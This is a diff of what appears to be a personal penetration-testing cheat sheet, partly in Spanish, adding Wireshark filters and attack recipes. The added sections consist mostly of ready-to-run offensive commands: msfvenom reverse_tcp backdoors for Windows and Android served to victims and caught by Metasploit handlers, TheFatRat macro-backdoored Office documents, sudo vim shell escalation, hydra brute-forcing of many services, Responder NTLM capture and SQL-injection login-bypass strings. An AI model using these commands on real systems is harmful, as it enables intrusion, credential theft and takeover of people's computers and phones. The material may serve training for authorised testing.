@@ -1,27 +1,3 @@
-2.	FOOTPRINTING
-
-
-#####Google Dorks
-
-|Operador|	Descripción|	Ejemplo|
-| :--- | :--- |:--- |
-|“ ”	|Coincide exactamente con el texto entre comillas dobles| “Behackerpro”|
-|–	|Excluye de la búsqueda el término que va después del signo “-”|	malware -ransomware
-|+	Incluye el término de va después del signo “+”	|ciber +resiliencia
-|"#"	|Busca un hashtag	|"#"pentesting
-|OR	Devuelve resultados sobre un término u otro	|Smartphone OR tablet
-| barra	|Devuelve resultados sobre un término u otro. El mismo OR	|blackhat 1 defcon
-|( )	|Utilizado para agrupar operadores	|(ballmer OR gates) windows
-|cache:	|Muestra la página en cache	|cache:www.eltiempo.co.
-|inurl:	|Busca el termino escrito dentro de la URL de los sitios indexados	|inurl:admin.php
-|site:	|Busca todo lo relacionado con el termino escrito como sitio	|site:.eltiempo.com -site:www.eltiempo.com -inurl:blogs
-|filetype:	|Buscar el termino escrito como tipo de archivo, ejemplo: pdf, pptp, log, sql	|filetype:log
-|intitle:	|Busca el termino escrito dentro del título	|intitle:mikrotik
-|allintitle:	|Devuelve resultados que coincidan en el título con el término escrito	|allintitle:”Noticias Principales de Colombia”
-|intext:	|Busca páginas que en su texto contienen el termino escrito 	|intext:owasp
-|allintext:	|Devuelve todos los resultados que contengan todas las palabras especificadas	|allintext:”asterisk digium
-
-
 Information Gathering
 ````js
 •	https://larutadelhacker.com/google-dorks-busquedas-avanzadas-en-google/ Google Dorks
@@ -408,3 +384,214 @@ rtgen sha256 loweralpha-numeric 1 10 0 1000 4000 0 // generate a new rainbow tab
 rtgen md5 loweralpha-hnumeric 1 4 1 1000 1000 0 //
 then use app rainbowcrack // add the hashes and the rainbow table option
 ```
+### wireshark
+````js
+### wireshark filters
+// filters by post
+http.request.method==POST
+smtp // email
+pop // email
+dns.qry.type == 1 -T fields -e dns.qry.name = show records present in this pcap
+dns.flags.response == 0 = There are 56 unique DNS queries.
+tcp // show tcp packets
+//find packets
+edit > find packets > packet list : packet bytes > case sensitive: strings > string "pass" :search
+//DDOS ATTACK
+look number of packets first column
+then >statistics > ipv4 statistics > destination and ports
+/// tshark cli
+tshark -r dns.cap | wc -l //count how many packets are in a capture
+tshark -r dns.cap -Y "dns.qry.type == 1" -T fields -e dns.qry.name //show records present in this pcap
+tshark -r dnsexfil.pcap -Y "dns.flags.response == 0" | wc -l 
+tshark -r pcap -T fields -e dns.qry.name | uniq | wc -l //There are 56 unique DNS queries.
+tshark -r pcap | head -n2 //DNS server side to identify 'special' queries
+tshark -r pcap -Y "dns.flags.response == 0" -T fields -e "dns.qry.name" | sed "s/.m4lwhere.org//g" | tr -d "\n" `exfiltrate data with regx`
+````
+#### Privilege scalation reverse shell
+````
+ssh -p 2222 mith@10.10.123.23
+sudo -ls ###list de su permisions
+sudo vim -c ':!/bin/sh' ### privilege scalation
+````
+https://gtfobins.github.io/
+#### other
+``````Js
+hydra -l root -P passwords.txt [-t 32] ftp
+hydra -L usernames.txt -P pass.txt mysql
+hashcat.exe -m hash.txt rokyou.txt -O
+nmap -p443,80,53,135,8080,8888 -A -O -sV -sC -T4 -oN nmapOutput 0.10.10 
+wpscan --url https://10.10.10.10 --enumerate u
+netdiscover -i eth0
+john --format=raw-md5 password.txt [ To change password to plain text ]
+``````
+#### vulnerability scanning
+```
+nikto -h url -Cgidirs all
+```
+#### System hacking
+```js
+// 1 - on a windows machine
+wmic useraccount get name,sid //list users
+// using a tool
+Pwdump7.exe >> /path/file.txt //get a file to crack
+// using ophcrack to crack the hash with rainbow tables
+ophcrack >> tables >> vista free
+// cracking with rainbow tables using winrtgen to create a rainbow table
+winrtgen >> add table >> hashntlm
+rainbowcrack >> select the obtained file >> select dircreatd with winrtgen
+// 2 - using responder to capture the traffic of the windows system
+//run a shared folder on windows
+//capture the ntlm hash >> cracking with jhon
+chmod +x responder.py
+./Responder.py -I eth0
+-I = interface //ifconfig
+// cracking the ntlm capture with ntlm
+john capture.txt
+lopthcr4ck // helps to crack ntlm passwords store on windows
+// system hacking windows
+// look for an exploit and try to get remote access to the victim using msfvnom,metasploit and rat
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=my.ip LPORT=my.port -o /root/Desktop/test.exe
+-p = payload
+--platform = Os
+-a = architecture
+-f = format of the payload
+-o = output dir
+// now with try to share the file with the victim
+// we try three forms
+// #1 - option
+mkdir /var/www/html/share
+chmod -R 755 /var/www/html/share
+chown -R www-data:www-data /var/www/html/share
+// copy the text.exe to the new server
+cp /root/Desktop/test.exe /var/www/html/share
+// #2 - option
+python -m SimpleHttpServer 80
+// #3 - option
+python3 http.server 80
+// start the serverwith apache
+service apache2 start //apache version
+//now we open msfconsole to gain a inverse shell with meterpreter
+use exploit/multi/handler //similar to nc -nlvp .port
+set payload windows/meterpreter/reverse_tcp
+set LHOST my.ip
+set LPORT my.port
+exploit/run // run the exploit
+//share the file with the victim
+my.ip/share
+//inside the victim's machine
+run the exe // text.exe share with the server
+//look at the metasploit session
+sysinfo // system info
+//now with try to enumerate to know misconfigurations on the w10 system
+//using PowerSploit
+upload /path/PowerUp.ps1 powerup.ps1 // with meterpreter
+shell // with shell with change from meterpreter to windows shell
+// now we execute powerup
+powershell -ExecutionPolicy Bypass -Command ". .\PowerUp.ps1;Invoke-AllChecks"
+// now we know that windows is vulnerable to dll injection
+// change to meterpreter shell with exit & run
+run vnc // will open a VNC remote control on the victim
+// Now we will try another method to gain access to a machine
+// with TheFatRat
+chmod +x fatrat
+chmod +x setup.sh
+chmd +x powerfull.sh
+./setup.sh
+//run fatrat
+option 6 // create fud.. [Excelent]
+option 3 // create apache + ps1
+//put the lhost and lport
+enter the name for files : payload
+option 3 // for choosing meterpreter/reverse_tcp
+// payload generated
+option 9 // back to the menu
+option 7 // create a back office
+option 2 // macro windows and select lhost and lport
+// enter the name for the doc file
+// use custom exe backdoor Y
+option 3 // reverse_tcp 
+// backdoor inside the doc generate
+// share document with the server option 1 and 2 above
+// start msfconsole to gain meterpreter shell
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST my.ip
+set RHOST my.port
+exploit / run 
+```
+#### Mobile Hacking
+```js
+// create a backdoor with msfvenom
+msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=my.ip R > path/backdoor.apk
+// share with some of the three methods above
+// now with metasploit
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST my.ip
+exploit -j -z // exploit with a background job
+// install the apk in android & the session will open
+sessions -i 1 // will display the meterpreter
+sysinfo // to know the os
+// Using PhoneSploit
+run phonesploit
+option 3 // new phone
+enter the ip // ip' phone &
+option 4 // to shell on the phone
+//in the menu you can search, download, info
+```
+#### Using the methodology
+1.  `netdiscover -i eth0`
+2.  `map -p- 10.10.10.10 [ Any IP ]` port discovery
+3. `nmap -p443,80,53,135,8080,8888 -A -O -sV -sC -T4 -oN nmapOutput 10.10.10.10`
+4. `gobuster -e -u** http://10.10.10.10 -w wordlsit.txt` on a webserver running
+5. trying sqli payloads on the forms
+```
+admin' --  
+admin' #  
+admin'/*  
+' or 1=1--  
+' or 1=1#  
+' or 1=1/*  
+') or '1'='1--  
+') or ('1'='1—
+```
+6. bruteforcing web servers
+```
+hydra -l root -P passwords.txt [-t 32] <IP> **_ftp_**
+hydra -L usernames.txt -P pass.txt <IP> **_mysql_**
+hydra -l USERNAME -P /path/to/passwords.txt -f <IP> **_pop3_** -V
+hydra -V -f -L <userslist> -P <passwlist> **_rdp_**://<IP>
+hydra -P common-snmp-community-strings.txt target.com **_snmp_**
+hydra -l Administrator -P words.txt 192.168.1.12 **_smb_** -t 1
+hydra -l root -P passwords.txt <IP> **_ssh_**
+```
+7. `cewl example.com -m 5 -w words.txt` custom wordlist
+8. search for vulns
+```js
+searchsploit 'Linux Kernel'
+searchsploit -m 7618 // Paste the exploit in the current directory
+searchsploit -p 7618[.c] // Show complete path
+searchsploit — nmap file.xml // Search vulns inside a Nmap XML result
+``` 
+2.	FOOTPRINTING
+
+
+#####Google Dorks
+
+|Operador|	Descripción|	Ejemplo|
+| :--- | :--- |:--- |
+|“ ”	|Coincide exactamente con el texto entre comillas dobles| “Behackerpro”|
+|–	|Excluye de la búsqueda el término que va después del signo “-”|	malware -ransomware
+|+	Incluye el término de va después del signo “+”	|ciber +resiliencia
+|"#"	|Busca un hashtag	|"#"pentesting
+|OR	Devuelve resultados sobre un término u otro	|Smartphone OR tablet
+| barra	|Devuelve resultados sobre un término u otro. El mismo OR	|blackhat 1 defcon
+|( )	|Utilizado para agrupar operadores	|(ballmer OR gates) windows
+|cache:	|Muestra la página en cache	|cache:www.eltiempo.co.
+|inurl:	|Busca el termino escrito dentro de la URL de los sitios indexados	|inurl:admin.php
+|site:	|Busca todo lo relacionado con el termino escrito como sitio	|site:.eltiempo.com -site:www.eltiempo.com -inurl:blogs
+|filetype:	|Buscar el termino escrito como tipo de archivo, ejemplo: pdf, pptp, log, sql	|filetype:log
+|intitle:	|Busca el termino escrito dentro del título	|intitle:mikrotik
+|allintitle:	|Devuelve resultados que coincidan en el título con el término escrito	|allintitle:”Noticias Principales de Colombia”
+|intext:	|Busca páginas que en su texto contienen el termino escrito 	|intext:owasp
+|allintext:	|Devuelve todos los resultados que contengan todas las palabras especificadas	|allintext:”asterisk digium
